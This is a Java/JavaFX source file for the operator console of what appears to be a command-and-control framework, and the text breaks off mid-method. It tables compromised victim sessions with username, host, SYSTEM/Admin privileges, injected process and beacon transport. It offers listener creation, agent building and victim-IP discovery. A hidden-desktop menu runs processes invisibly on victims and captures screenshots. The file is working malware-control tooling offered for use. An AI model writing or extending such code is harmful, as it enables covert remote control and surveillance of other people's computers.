package ui;

import models.*;
import service.ApiService;
import ui.dialogs.CreateListenerDialog;
import ui.dialogs.BuildAgentDialog;
import com.google.gson.JsonObject;
import javafx.application.Platform;
import javafx.beans.property.SimpleStringProperty;
import javafx.collections.*;
import javafx.geometry.*;
import javafx.scene.Node;
import javafx.scene.control.*;
import javafx.scene.control.cell.*;
import javafx.scene.input.Clipboard;
import javafx.scene.input.ClipboardContent;
import javafx.scene.layout.*;
import javafx.stage.Stage;
import java.util.*;

/**
 * SessionsTab — main (and only) tab.
 *
 * Layout (AdaptixC2-style — two-part split):
 *
 *   ┌─────────────────────────────────────────────────────────────┐
 *   │  ACTIVE SESSIONS                                            │
 *   │  [sessions table — always on top]                           │  ← UPPER (fixed)
 *   ├─────────────────────────────────────────────────────────────┤
 *   │ [Listeners] [agent1@host ✕] [agent2@host ✕]                │  ← LOWER (TabPane)
 *   │ ┌─────────────────────────────────────────────────────────┐ │
 *   │ │                                                         │ │
 *   │ │  Listeners tab: listener table                          │ │
 *   │ │  Agent tab:     terminal console                        │ │
 *   │ │                                                         │ │
 *   │ └─────────────────────────────────────────────────────────┘ │
 *   ├─────────────────────────────────────────────────────────────┤
 *   │  ● Connected | Sessions: 1 | Listeners: 1 | Uptime: 6m 11s │
 *   └─────────────────────────────────────────────────────────────┘
 *
 * Bottom panel is a TabPane:
 *   - "Listeners" tab is always present (cannot be closed)
 *   - Agent console tabs are added on double-click / "Interact"
 *   - Each agent tab is closable
 */
public class SessionsTab {
    private final ApiService api;
    private final Stage primaryStage;

    // Sessions
    private TableView<Session> sessionTable;
    private ObservableList<Session> sessionList = FXCollections.observableArrayList();
    private TabPane bottomTabPane;
    private final Map<String, SessionTab> openTabs = new HashMap<>();
    private final Map<String, String> sessionNotes = new HashMap<>();
    private final Map<String, String> sessionColors = new HashMap<>();

    // Listeners
    private TableView<ListenerInfo> listenerTable;
    private ObservableList<ListenerInfo> listenerList = FXCollections.observableArrayList();

    // Style
    private static final String BG     = "#0a0e14";
    private static final String PANEL  = "#161b22";
    private static final String BORDER = "#30363d";
    private static final String FG     = "#c9d1d9";
    private static final String DIM    = "#8b949e";
    private static final String ACCENT = "#58a6ff";
    private static final String OK     = "#3fb950";
    private static final String WARN   = "#d29922";  // SLEEPING state — yellow/amber
    private static final String ERR    = "#f85149";

    public SessionsTab(ApiService api, Stage primaryStage) {
        this.api = api;
        this.primaryStage = primaryStage;
    }

    public Node getContent() {
        VBox root = new VBox(0);
        root.setStyle("-fx-background-color: " + BG + ";");

        // ── UPPER: Sessions table ───────────────────────────────────
        VBox sessionsBox = new VBox(5);
        sessionsBox.setPadding(new Insets(8, 12, 4, 12));
        sessionsBox.setStyle("-fx-background-color: " + BG + ";");

        Label sessionsTitle = new Label("ACTIVE SESSIONS");
        sessionsTitle.setStyle("-fx-text-fill: " + ACCENT + "; -fx-font-size: 11px;"
                + " -fx-font-weight: bold; -fx-letter-spacing: 1.5;");

        buildSessionTable();
        VBox.setVgrow(sessionTable, Priority.ALWAYS);
        sessionsBox.getChildren().addAll(sessionsTitle, sessionTable);

        // ── LOWER: TabPane with Listeners tab + agent tabs ──────────
        bottomTabPane = new TabPane();
        bottomTabPane.setStyle("-fx-tab-max-height: 28px; -fx-background-color: " + BG + ";");

        // "Listeners" tab — always present, NOT closable
        buildListenerTable();
        VBox listenerContent = new VBox(5);
        listenerContent.setPadding(new Insets(8, 12, 8, 12));
        listenerContent.setStyle("-fx-background-color: " + BG + ";");
        VBox.setVgrow(listenerTable, Priority.ALWAYS);
        listenerContent.getChildren().add(listenerTable);

        Tab listenersTab = new Tab("Listeners");
        listenersTab.setContent(listenerContent);
        listenersTab.setClosable(false);  // ← cannot be closed
        bottomTabPane.getTabs().add(listenersTab);

        // ── Split: sessions on top, tabpane on bottom ───────────────
        SplitPane split = new SplitPane();
        split.setOrientation(Orientation.VERTICAL);
        split.setDividerPositions(0.45);
        split.setStyle("-fx-background-color: " + BG + ";");
        split.getItems().addAll(sessionsBox, bottomTabPane);
        VBox.setVgrow(split, Priority.ALWAYS);

        root.getChildren().add(split);

        // ── Periodic relative-time refresh ────────────────────────────────
        // The "Last Seen" column shows relative time ("5s ago", "2m ago").
        // Without this timer, the display goes stale — an agent that died
        // 10 minutes ago still shows "just now" because the cell hasn't
        // been re-rendered. This timeline fires every 5 seconds and
        // forces the table to refresh, recomputing the relative time.
        javafx.animation.Timeline timeline = new javafx.animation.Timeline(
            new javafx.animation.KeyFrame(javafx.util.Duration.seconds(5), event -> {
                if (!sessionList.isEmpty()) {
                    sessionTable.refresh();
                }
            })
        );
        timeline.setCycleCount(javafx.animation.Animation.INDEFINITE);
        timeline.play();

        return root;
    }

    // ── Session table builder ────────────────────────────────────────────

    private void buildSessionTable() {
        sessionTable = new TableView<>(sessionList);
        sessionTable.setStyle("-fx-background-color: " + BG + "; -fx-border-color: " + BORDER + ";"
                + " -fx-border-radius: 4px;");
        sessionTable.setPlaceholder(new Label("No active sessions — build an agent and run it on target"));
        sessionTable.setMaxHeight(Double.MAX_VALUE);
        sessionTable.setColumnResizePolicy(TableView.CONSTRAINED_RESIZE_POLICY);

        TableColumn<Session, String> tagCol = new TableColumn<>("");
        tagCol.setCellValueFactory(d -> new SimpleStringProperty(
            sessionColors.getOrDefault(d.getValue().getId(), "")));
        tagCol.setCellFactory(col -> new TableCell<>() {
            @Override
            protected void updateItem(String item, boolean empty) {
                super.updateItem(item, empty);
                if (empty || item == null || item.isEmpty()) {
                    setText("");
                    setStyle("-fx-background-color: transparent;");
                } else {
                    setText("");
                    setStyle("-fx-background-color: " + item + ";");
                }
            }
        });
        tagCol.setPrefWidth(6);
        tagCol.setResizable(false);

        TableColumn<Session, String> idCol = new TableColumn<>("ID");
        idCol.setCellValueFactory(d -> new SimpleStringProperty(
            d.getValue().getId().substring(0, Math.min(8, d.getValue().getId().length()))));
        idCol.setPrefWidth(80);

        TableColumn<Session, String> userCol = new TableColumn<>("User");
        userCol.setCellValueFactory(new PropertyValueFactory<>("username"));
        userCol.setPrefWidth(110);

        TableColumn<Session, String> hostCol = new TableColumn<>("Hostname");
        hostCol.setCellValueFactory(new PropertyValueFactory<>("hostname"));
        hostCol.setPrefWidth(140);

        TableColumn<Session, String> osCol = new TableColumn<>("OS");
        osCol.setCellValueFactory(new PropertyValueFactory<>("os"));
        osCol.setPrefWidth(90);

        TableColumn<Session, String> archCol = new TableColumn<>("Arch");
        archCol.setCellValueFactory(new PropertyValueFactory<>("arch"));
        archCol.setPrefWidth(60);
        archCol.setStyle("-fx-alignment: CENTER;");

        // ── v9 IP chain — source(private) → true(public) → redirector(server-seen) ──
        // Internal IP = the AGENT's own NIC address (agent-reported at checkin).
        // The old column showed the server-side TCP peer, which is the REDIRECTOR's
        // address whenever a pivot is in path — exactly the wrong-info bug the
        // operator flagged.
        TableColumn<Session, String> ipCol = new TableColumn<>("Internal IP");
        ipCol.setCellValueFactory(d -> new SimpleStringProperty(d.getValue().getInternalIpDisplay()));
        ipCol.setPrefWidth(120);

        // True IP = agent's public/NAT IP — discovered via the operator-triggered
        // `trueip` task (right-click → Discover True IP). "—" until tasked.
        TableColumn<Session, String> trueIpCol = new TableColumn<>("True IP");
        trueIpCol.setCellValueFactory(d -> {
            String v = d.getValue().getPublic_ip();
            return new SimpleStringProperty(v == null || v.isBlank() ? "—" : v);
        });
        trueIpCol.setPrefWidth(100);

        // Redirector = the hop the teamserver actually sees (Ubuntu when a
        // redirector is deployed) — the destination of the egress chain.
        TableColumn<Session, String> redirectorCol = new TableColumn<>("Redirector");
        redirectorCol.setCellValueFactory(new PropertyValueFactory<>("ip"));
        redirectorCol.setPrefWidth(110);

        TableColumn<Session, String> pidCol = new TableColumn<>("PID");
        pidCol.setCellValueFactory(d -> new SimpleStringProperty(
            String.valueOf(d.getValue().getPid())));
        pidCol.setPrefWidth(60);
        pidCol.setStyle("-fx-alignment: CENTER;");

        // ── v9: hosting process — "explorer.exe"/"svchost.exe" when the beacon
        // was injected there, "none" when it runs standalone (agent's own image).
        TableColumn<Session, String> procCol = new TableColumn<>("Process");
        procCol.setCellValueFactory(d -> new SimpleStringProperty(d.getValue().getProcessDisplay()));
        procCol.setPrefWidth(110);

        // ── v9: transport the beacon rides (protocol of the listener it
        // authenticated to: https/tcp/udp/smb/grpc/dns)
        TableColumn<Session, String> transportCol = new TableColumn<>("Transport");
        transportCol.setCellValueFactory(d -> {
            String v = d.getValue().getTransport();
            return new SimpleStringProperty(v == null || v.isBlank() ? "—" : v.toUpperCase());
        });
        transportCol.setPrefWidth(90);
        transportCol.setStyle("-fx-alignment: CENTER;");

        // ── v9: privilege level on the victim — SYSTEM / Admin / User
        TableColumn<Session, String> privsCol = new TableColumn<>("Privs");
        privsCol.setCellValueFactory(d -> {
            String v = d.getValue().getPrivs();
            String p = (v == null || v.isBlank()) ? "user" : v.toLowerCase();
            if (p.equals("system")) return new SimpleStringProperty("SYSTEM");
            return new SimpleStringProperty(p.substring(0, 1).toUpperCase() + p.substring(1));
        });
        privsCol.setCellFactory(col -> new TableCell<>() {
            @Override
            protected void updateItem(String item, boolean empty) {
                super.updateItem(item, empty);
                if (empty || item == null) {
                    setText("");
                    setStyle("");
                } else {
                    setText(item);
                    String color;
                    switch (item) {
                        case "SYSTEM": color = "#f85149"; break;  // NT AUTHORITY\SYSTEM — god mode
                        case "Admin":  color = "#d29922"; break;  // elevated user
                        default:       color = "#8b949e"; break;  // plain user
                    }
                    setStyle("-fx-text-fill: " + color
                        + "; -fx-font-weight: bold; -fx-alignment: CENTER;");
                }
            }
        });
        privsCol.setPrefWidth(80);
        privsCol.setStyle("-fx-alignment: CENTER;");

        TableColumn<Session, String> sleepCol = new TableColumn<>("Sleep");
        sleepCol.setCellValueFactory(d -> new SimpleStringProperty(
            d.getValue().getSleep_time() + "s"));
        sleepCol.setPrefWidth(60);
        sleepCol.setStyle("-fx-alignment: CENTER;");

        TableColumn<Session, String> jitterCol = new TableColumn<>("Jitter");
        jitterCol.setCellValueFactory(d -> new SimpleStringProperty(
            String.format("%.0f%%", d.getValue().getJitter() * 100)));
        jitterCol.setPrefWidth(60);
        jitterCol.setStyle("-fx-alignment: CENTER;");

        TableColumn<Session, String> lastSeenCol = new TableColumn<>("Last Seen");
        lastSeenCol.setCellValueFactory(d -> new SimpleStringProperty(
            formatLastSeen(d.getValue().getLast_seen())));
        lastSeenCol.setPrefWidth(100);

        TableColumn<Session, String> statusCol = new TableColumn<>("Status");
        statusCol.setCellValueFactory(d -> {
            Session s = d.getValue();
            String status;
            if (!s.isActive()) {
                status = "DEAD";      // operator manually killed
            } else if (s.isStale()) {
                status = "SLEEPING";  // overdue but expected back — server is patient
            } else {
                status = "ALIVE";    // checking in normally
            }
            return new SimpleStringProperty(status);
        });
        statusCol.setCellFactory(col -> new TableCell<>() {
            @Override
            protected void updateItem(String item, boolean empty) {
                super.updateItem(item, empty);
                if (empty || item == null) {
                    setText("");
                    setStyle("");
                } else {
                    setText(item);
                    String color;
                    switch (item) {
                        case "ALIVE":   color = OK; break;
                        case "SLEEPING": color = WARN; break;
                        default:        color = ERR; break;
                    }
                    setStyle("-fx-text-fill: " + color
                        + "; -fx-font-weight: bold; -fx-alignment: CENTER;");
                }
            }
        });
        statusCol.setPrefWidth(70);
        statusCol.setStyle("-fx-alignment: CENTER;");

        TableColumn<Session, String> checkinCol = new TableColumn<>("#");
        checkinCol.setCellValueFactory(d -> new SimpleStringProperty(
            String.valueOf(d.getValue().getCheckin_num())));
        checkinCol.setPrefWidth(50);
        checkinCol.setStyle("-fx-alignment: CENTER;");

        TableColumn<Session, String> noteCol = new TableColumn<>("Note");
        noteCol.setCellValueFactory(d -> new SimpleStringProperty(
            sessionNotes.getOrDefault(d.getValue().getId(), "")));
        noteCol.setPrefWidth(140);

        sessionTable.getColumns().addAll(
            tagCol, idCol, userCol, hostCol, osCol, archCol,
            ipCol, trueIpCol, redirectorCol,
            procCol, transportCol, privsCol, pidCol,
            sleepCol, jitterCol, lastSeenCol, statusCol,
            checkinCol, noteCol
        );

        sessionTable.setRowFactory(tv -> {
            TableRow<Session> row = new TableRow<>();
            row.setOnMouseClicked(e -> {
                if (e.getClickCount() == 2 && !row.isEmpty()) openTab(row.getItem());
            });
            return row;
        });

        sessionTable.setContextMenu(buildSessionContextMenu());
    }

    // ── Listener table builder ──────────────────────────────────────────

    private void buildListenerTable() {
        listenerTable = new TableView<>(listenerList);
        listenerTable.setStyle("-fx-background-color: " + BG + "; -fx-border-color: " + BORDER + ";"
                + " -fx-border-radius: 4px;");
        listenerTable.setPlaceholder(new Label("No listeners running — right-click → Create Listener"));
        listenerTable.setColumnResizePolicy(TableView.CONSTRAINED_RESIZE_POLICY);
        listenerTable.setMaxHeight(Double.MAX_VALUE);

        TableColumn<ListenerInfo, String> nameCol = new TableColumn<>("Name");
        nameCol.setCellValueFactory(new PropertyValueFactory<>("name"));
        nameCol.setPrefWidth(140);

        TableColumn<ListenerInfo, String> protoCol = new TableColumn<>("Protocol");
        protoCol.setCellValueFactory(new PropertyValueFactory<>("protocol"));
        protoCol.setPrefWidth(80);

        TableColumn<ListenerInfo, String> addrCol = new TableColumn<>("Bind Address");
        addrCol.setCellValueFactory(d -> new SimpleStringProperty(
            d.getValue().getHost() + ":" + d.getValue().getPort()));
        addrCol.setPrefWidth(160);

        TableColumn<ListenerInfo, String> domainCol = new TableColumn<>("Callback Domain");
        domainCol.setCellValueFactory(d -> new SimpleStringProperty(
            d.getValue().getDomain() != null && !d.getValue().getDomain().isEmpty()
                ? d.getValue().getDomain() : "-"));
        domainCol.setPrefWidth(180);

        TableColumn<ListenerInfo, String> dpCol = new TableColumn<>("Ext Port");
        dpCol.setCellValueFactory(d -> {
            int dp = d.getValue().getDomain_port();
            return new SimpleStringProperty(dp > 0 ? String.valueOf(dp) : "-");
        });
        dpCol.setPrefWidth(80);
        dpCol.setStyle("-fx-alignment: CENTER;");

        TableColumn<ListenerInfo, String> statusCol = new TableColumn<>("Status");
        statusCol.setCellValueFactory(d -> new SimpleStringProperty(
            d.getValue().isActive() ? "ACTIVE" : "DOWN"));
        statusCol.setCellFactory(col -> new TableCell<>() {
            @Override
            protected void updateItem(String val, boolean empty) {
                super.updateItem(val, empty);
                if (empty || val == null) {
                    setText("");
                    setStyle("");
                } else {
                    setText(val);
                    setStyle("-fx-text-fill: " + (val.equals("ACTIVE") ? OK : ERR)
                        + "; -fx-font-weight: bold; -fx-alignment: CENTER;");
                }
            }
        });
        statusCol.setPrefWidth(80);
        statusCol.setStyle("-fx-alignment: CENTER;");

        TableColumn<ListenerInfo, Void> actionCol = new TableColumn<>("");
        actionCol.setCellFactory(col -> new TableCell<>() {
            private final Button btn = new Button("✕");
            {
                btn.setStyle("-fx-background-color: transparent; -fx-text-fill: " + ERR + ";"
                    + " -fx-cursor: hand; -fx-font-size: 14px; -fx-padding: 2px 8px;");
                btn.setOnAction(e -> {
                    ListenerInfo li = getTableView().getItems().get(getIndex());
                    removeListener(li);
                });
            }
            @Override
            protected void updateItem(Void item, boolean empty) {
                super.updateItem(item, empty);
                if (empty) setGraphic(null);
                else setGraphic(btn);
            }
        });
        actionCol.setPrefWidth(50);
        actionCol.setStyle("-fx-alignment: CENTER;");

        listenerTable.getColumns().addAll(nameCol, protoCol, addrCol, domainCol, dpCol, statusCol, actionCol);

        ContextMenu lctx = new ContextMenu();
        lctx.setStyle("-fx-background-color: " + PANEL + "; -fx-border-color: " + BORDER + ";");
        MenuItem createItem = new MenuItem("+ Create New Listener...");
        createItem.setStyle("-fx-text-fill: " + ACCENT + ";");
        createItem.setOnAction(e -> new CreateListenerDialog(primaryStage, api, this::refreshListeners).show());
        MenuItem buildItem = new MenuItem("▶ Build Agent...");
        buildItem.setStyle("-fx-text-fill: " + ACCENT + ";");
        buildItem.setOnAction(e -> new BuildAgentDialog(primaryStage, api, null).show());
        lctx.getItems().addAll(createItem, buildItem);
        listenerTable.setContextMenu(lctx);
    }

    // ── Session right-click context menu ─────────────────────────────────

    private ContextMenu buildSessionContextMenu() {
        ContextMenu ctx = new ContextMenu();
        ctx.setStyle("-fx-background-color: " + PANEL + "; -fx-border-color: " + BORDER + ";");

        MenuItem interact = menuItem("Interact", "▶", ACCENT);
        interact.setOnAction(e -> {
            Session s = sessionTable.getSelectionModel().getSelectedItem();
            if (s != null) openTab(s);
        });

        // ── Hidden Desktop submenu ──
        Menu hiddenDesktop = new Menu("🖥  Live Desktop");
        hiddenDesktop.setStyle("-fx-text-fill: " + ACCENT + ";");

        MenuItem hdStart = new MenuItem("  ▶  Open Live Desktop (Real-time View)");
        hdStart.setStyle("-fx-text-fill: " + OK + "; -fx-font-weight: bold;");
        hdStart.setOnAction(e -> {
            Session s = sessionTable.getSelectionModel().getSelectedItem();
            if (s != null) {
                new ui.dialogs.HiddenDesktopWindow(primaryStage, api, s).show();
            }
        });

        MenuItem hdScreenshot = new MenuItem("  📸  Screenshot");
        hdScreenshot.setStyle("-fx-text-fill: " + FG + ";");
        hdScreenshot.setOnAction(e -> {
            Session s = sessionTable.getSelectionModel().getSelectedItem();
            if (s != null) sendHiddenDesktopCmd(s, "screenshot");
        });

        MenuItem hdExec = new MenuItem("  ⚙  Execute Process...");
        hdExec.setStyle("-fx-text-fill: " + FG + ";");
        hdExec.setOnAction(e -> {
            Session s = sessionTable.getSelectionModel().getSelectedItem();
            if (s != null) {
                TextInputDialog dlg = new TextInputDialog("calc.exe");
                dlg.setTitle("Execute on Hidden Desktop");
                dlg.setHeaderText("Process to run invisibly on hidden desktop");
                dlg.setContentText("Command:");
                dlg.showAndWait().ifPresent(cmd -> sendHiddenDesktopCmd(s, "exec " + cmd));
            }
        });

        MenuItem hdList = new MenuItem("  📋  List Desktops");
        hdList.setStyle("-fx-text-fill: " + FG + ";");
        hdList.setOnAction(e -> {
            Session s = sessionTable.getSelectionModel().getSelectedItem();
            if (s != null) sendHiddenDesktopCmd(s, "list");
        });

        MenuItem hdStop = new MenuItem("  ✕  Stop Hidden Desktop");
        hdStop.setStyle("-fx-text-fill: " + ERR + ";");
        hdStop.setOnAction(e -> {
            Session s = sessionTable.getSelectionModel().getSelectedItem();
            if (s != null) sendHiddenDesktopCmd(s, "stop");
        });

        hiddenDesktop.getItems().addAll(hdStart, hdScreenshot, hdExec, hdList, new SeparatorMenuItem(), hdStop);

        // ── v10 UNIFIED Graph menu (replaces separate Attack Graph + AD Map) ──
        // Operator wanted ONE graph view showing compromised system + domain
        // membership + DC + every domain computer + observed neighbours, all
        // in the same picture. Both windows are merged into NetworkGraphWindow.
        Menu graphs = new Menu("🕸  Graphs");
        graphs.setStyle("-fx-text-fill: " + ACCENT + ";");

        MenuItem gNetwork = new MenuItem("  🕸  Network Graph (unified — attack + AD + neighbours)");
        gNetwork.setStyle("-fx-text-fill: " + OK + "; -fx-font-weight: bold;");
        gNetwork.setOnAction(e -> {
            Session sel = sessionTable.getSelectionModel().getSelectedItem();
            Session s = sel != null ? sel : (sessionTable.getItems().isEmpty() ? null : sessionTable.getItems().get(0));
            if (s == null) return; // no sessions connected yet — nothing to graph (was: NPE inside the window ctor)
            new ui.graph.NetworkGraphWindow(primaryStage, api, s).show();
        });

        // Keep the legacy individual windows available for backward compat:
        MenuItem gAttack = new MenuItem("  🎯  (legacy) Attack Graph only");
        gAttack.setStyle("-fx-text-fill: " + DIM + ";");
        gAttack.setOnAction(e -> {
            Session sel = sessionTable.getSelectionModel().getSelectedItem();
            Session s = sel != null ? sel : (sessionTable.getItems().isEmpty() ? null : sessionTable.getItems().get(0));
            new ui.graph.NetworkGraphWindow(primaryStage, api, s).show();
        });

        MenuItem gAdMap = new MenuItem("  🗺  (legacy) AD Map only");
        gAdMap.setStyle("-fx-text-fill: " + DIM + ";");
        gAdMap.setOnAction(e -> {
            Session s = sessionTable.getSelectionModel().getSelectedItem();
            if (s != null) new ui.graph.AdMapWindow(primaryStage, api, s).show();
        });

        graphs.getItems().addAll(gNetwork, new SeparatorMenuItem(), gAttack, gAdMap);

        // ── v9: True IP discovery — fills the dashboard's "True IP" column ──
        MenuItem trueIp = menuItem("Discover True IP (public IP)", "\ud83c\udf10", ACCENT);
        trueIp.setOnAction(e -> {
            Session s = sessionTable.getSelectionModel().getSelectedItem();
            if (s != null) {
                try {
                    api.sendTask(s.getId(), "trueip", "");
                } catch (Exception ex) {
                    javafx.scene.control.Alert a = new javafx.scene.control.Alert(
                            javafx.scene.control.Alert.AlertType.WARNING,
                            "trueip task failed: " + ex.getMessage(),
                            javafx.scene.control.ButtonType.OK);
                    a.setHeaderText("Discover True IP");
                    a.showAndWait();
                }
            }
        });

        MenuItem copyId = menuItem("Copy Session ID", "📋", FG);
        copyId.setOnAction(e -> {
            Session s = sessionTable.getSelectionModel().getSelectedItem();
            if (s != null) copyToClipboard(s.getId());
        });

        MenuItem copyIp = menuItem("Copy IP", "📋", FG);
        copyIp.setOnAction(e -> {
            Session s = sessionTable.getSelectionModel().getSelectedItem();
            if (s != null) copyToClipboard(s.getIp());
        });

        MenuItem copyHost = menuItem("Copy Hostname", "📋", FG);
        copyHost.setOnAction(e -> {
            Session s = sessionTable.getSelectionModel().getSelectedItem();
            if (s != null) copyToClipboard(s.getHostname());
        });

        Menu colorTag = new Menu("Color Tag");
        colorTag.getItems().addAll(
            colorItem("Red",    "#f85149"),
            colorItem("Orange", "#db6d28"),
            colorItem("Yellow", "#d29922"),
            colorItem("Green",  "#3fb950"),
            colorItem("Blue",   "#58a6ff"),
            colorItem("Purple", "#bc8cff"),
            clearColorItem()
        );

        MenuItem note = menuItem("Add Note...", "📝", FG);
        note.setOnAction(e -> {
            Session s = sessionTable.getSelectionModel().getSelectedItem();
            if (s != null) addNote(s);
        });

        MenuItem export = menuItem("Export Session...", "💾", FG);
        export.setOnAction(e -> {
            Session s = sessionTable.getSelectionModel().getSelectedItem();
            if (s != null) exportSession(s);
        });

        Menu sleepMenu = new Menu("Set Sleep");
        for (int sec : new int[]{5, 15, 30, 60, 300, 600}) {
            MenuItem sm = new MenuItem(sec + "s");
            final int s = sec;
            sm.setOnAction(e -> {
                Session sess = sessionTable.getSelectionModel().getSelectedItem();
                if (sess != null) sendSleep(sess, s);
            });
            sleepMenu.getItems().add(sm);
        }

        MenuItem kill = menuItem("Kill Session", "✕", ERR);
        kill.setStyle("-fx-text-fill: " + ERR + ";");
        kill.setOnAction(e -> {
            Session s = sessionTable.getSelectionModel().getSelectedItem();
            if (s != null) killSession(s);
        });

        MenuItem createListener = menuItem("Create Listener...", "📡", ACCENT);
        createListener.setOnAction(e -> new CreateListenerDialog(primaryStage, api, this::refreshListeners).show());

        MenuItem buildAgent = menuItem("Build Agent...", "🔨", ACCENT);
        buildAgent.setOnAction(e -> new BuildAgentDialog(primaryStage, api, null).show());

        ctx.getItems().addAll(
            interact,
            hiddenDesktop,
            graphs,
            trueIp,
            new SeparatorMenuItem(),
            copyId, copyIp, copyHost,
            new SeparatorMenuItem(),
            colorTag,
            note,
            export,
            new SeparatorMenuItem(),
            sleepMenu,
            new SeparatorMenuItem(),
            kill,
            new SeparatorMenuItem(),
            createListener,
            buildAgent
        );
        return ctx;
    }

    private MenuItem menuItem(String label, String icon, String color) {
        MenuItem mi = new MenuItem(icon + "  " + label);
        mi.setStyle("-fx-text-fill: " + color + ";");
        return mi;
    }

    private MenuItem colorItem(String name, String hex) {
        MenuItem mi = new MenuItem(name);
        mi.setStyle("-fx-text-fill: " + hex + ";");
        mi.setOnAction(e -> {
            Session s = sessionTable.getSelectionModel().getSelectedItem();
            if (s != null) {
                sessionColors.put(s.getId(), hex);
                sessionTable.refresh();
            }
        });
        return mi;
    }

    private MenuItem clearColorItem() {
        MenuItem mi = new MenuItem("Clear");
        mi.setOnAction(e -> {
            Session s = sessionTable.getSelectionModel().getSelectedItem();
            if (s != null) {
                sessionColors.remove(s.getId());
                sessionTable.refresh();
            }
        });
        return mi;
    }

    // ── Actions ──────────────────────────────────────────────────────────

    private void copyToClipboard(String text) {
        ClipboardContent c = new ClipboardContent();
        c.putString(text);
        Clipboard.getSystemClipboard().setContent(c);
    }

    private void addNote(Session s) {
        TextInputDialog dlg = new TextInputDialog(sessionNotes.getOrDefault(s.getId(), ""));
        dlg.setTitle("Add Note");
        dlg.setHeaderText("Note for session " + s.getId().substring(0, 8));
        dlg.setContentText("Note:");
        dlg.showAndWait().ifPresent(note -> {
            sessionNotes.put(s.getId(), note);
            sessionTable.refresh();
        });
    }

    private void exportSession(Session s) {
        String summary = String.format(
            "Session Export\n  ID: %s\n  User: %s\n  Host: %s\n  OS: %s (%s)\n"
            + "  IP: %s\n  PID: %d\n  Sleep: %ds (jitter %.0f%%)\n  Checkins: %d\n  Last Seen: %s\n",
            s.getId(), s.getUsername(), s.getHostname(), s.getOs(), s.getArch(),
            s.getIp(), s.getPid(), s.getSleep_time(), s.getJitter() * 100,
            s.getCheckin_num(), s.getLast_seen()
        );
        copyToClipboard(summary);
    }

    private void sendSleep(Session s, int seconds) {
        new Thread(() -> {
            try { api.sendTask(s.getId(), "sleep", String.valueOf(seconds)); }
            catch (Exception e) {
                // J-M2 fix: was `/* silent */` — operator got no feedback
                // when the sleep task failed (server down, network error,
                // 401/403, malformed response). Log AND show an alert on
                // the FX thread so the operator knows the command didn't
                // land. Without this, they'd wait for the agent to slow
                // down and never realize the task never went out.
                System.err.println("[SessionsTab] sendSleep failed for "
                        + s.getId() + ": " + e);
                e.printStackTrace(System.err);
                Platform.runLater(() -> {
                    Alert a = new Alert(Alert.AlertType.ERROR,
                        "Failed to send sleep command to "
                            + s.getUsername() + "@" + s.getHostname()
                            + ":\n" + e.getMessage(),
                        ButtonType.OK);
                    a.setHeaderText("Sleep task failed");
                    a.showAndWait();
                });
            }
        }).start();
    }

    /** Send hidden_desktop command to agent via task queue. */
    private void sendHiddenDesktopCmd(Session s, String subArgs) {
        new Thread(() -> {
            try { api.sendTask(s.getId(), "hidden_desktop", subArgs); }
            catch (Exception e) { /* silent */ }
        }).start();
    }

    private void removeListener(ListenerInfo li) {
        Alert confirm = new Alert(Alert.AlertType.CONFIRMATION,
            "Remove listener \"" + li.getName() + "\"?");
        confirm.showAndWait().ifPresent(r -> {
            if (r == ButtonType.OK) {
                new Thread(() -> {
                    try {
                        api.removeListener(li.getId());
                        Platform.runLater(this::refreshListeners);
                    } catch (Exception e) {
                        // J-M2 fix: was `/* silent */` — operator clicked
                        // "Remove" and saw the listener stay in the table
                        // forever, with no clue why. Could be the listener
                        // was already gone server-side, the API was down,
                        // or a permission error. Log AND surface an alert.
                        System.err.println("[SessionsTab] removeListener failed for "
                                + li.getName() + " (" + li.getId() + "): " + e);
                        e.printStackTrace(System.err);
                        Platform.runLater(() -> {
                            Alert a = new Alert(Alert.AlertType.ERROR,
                                "Failed to remove listener \"" + li.getName() + "\":\n"
                                    + e.getMessage(),
                                ButtonType.OK);
                            a.setHeaderText("Remove listener failed");
                            a.showAndWait();
                        });
                    }
                }).start();
            }
        });
    }

    /**
     * Open agent interaction tab in the bottom TabPane.
     * If tab already exists, switch to it. Otherwise create new tab.
     */
    private void openTab(Session session) {
        if (session == null) return;
        // Check if tab already exists
        for (Tab t : bottomTabPane.getTabs()) {
            if (session.getId() != null && session.getId().equals(t.getId())) {
                bottomTabPane.getSelectionModel().select(t);
                return;
            }
        }

        // Create new agent tab
        SessionTab st = new SessionTab(session, api);
        String title = session.getUsername() + "@" + session.getHostname();
        String colorTag = sessionColors.get(session.getId());

        Tab tab;
        if (colorTag != null) {
            Label lbl = new Label(title);
            lbl.setStyle("-fx-text-fill: " + colorTag + ";");
            tab = new Tab();
            tab.setGraphic(lbl);
            tab.setContent(st.getRoot());
        } else {
            tab = new Tab(title, st.getRoot());
        }
        tab.setId(session.getId());
        tab.setClosable(true);
        tab.setOnClosed(e -> { st.cleanup(); openTabs.remove(session.getId()); });
        // C10 fix: `exit` command closes the tab through this callback (the
        // SessionTab runs its own cleanup first — double-cleanup is safe).
        st.setOnTabClose(() -> Platform.runLater(() -> {
            openTabs.remove(session.getId());
            bottomTabPane.getTabs().removeIf(t -> session.getId().equals(t.getId()));
        }));

        openTabs.put(session.getId(), st);
        bottomTabPane.getTabs().add(tab);
        bottomTabPane.getSelectionModel().select(tab);
    }

    private void killSession(Session session) {
        if (session == null) return;
        Optional<ButtonType> r = new Alert(Alert.AlertType.CONFIRMATION,
            "Kill " + session.getUsername() + "@" + session.getHostname() + "?").showAndWait();
        if (r.isPresent() && r.get() == ButtonType.OK) {
            new Thread(() -> {
                try {
                    api.killSession(session.getId());
                    Platform.runLater(() -> {
                        // C2 fix: JavaFX fires Tab.onClosed ONLY for user closes
                        // (the close button) — programmatic tab removal never
                        // triggers it, so the old code leaked the SessionTab's
                        // taskPoller thread + executor on every kill. Clean up
                        // explicitly, mirroring the setOnClosed handler.
                        SessionTab st = openTabs.remove(session.getId());
                        if (st != null) st.cleanup();
                        bottomTabPane.getTabs().removeIf(t -> session.getId().equals(t.getId()));
                        refresh();
                    });
                } catch (Exception e) {
                    // J-M2 fix: was `/* silent */` — operator clicked "Kill",
                    // confirmed, and... nothing. The session stayed in the
                    // table, the agent tab didn't close, and there was no
                    // indication whether the kill command reached the server.
                    // Could be a 404 (session already dead server-side), 401
                    // (token expired), or a network blip. Log AND alert.
                    System.err.println("[SessionsTab] killSession failed for "
                            + session.getId() + " ("
                            + session.getUsername() + "@" + session.getHostname() + "): " + e);
                    e.printStackTrace(System.err);
                    Platform.runLater(() -> {
                        Alert a = new Alert(Alert.AlertType.ERROR,
                            "Failed to kill session "
                                + session.getUsername() + "@" + session.getHostname()
                                + ":\n" + e.getMessage(),
                            ButtonType.OK);
                        a.setHeaderText("Kill session failed");
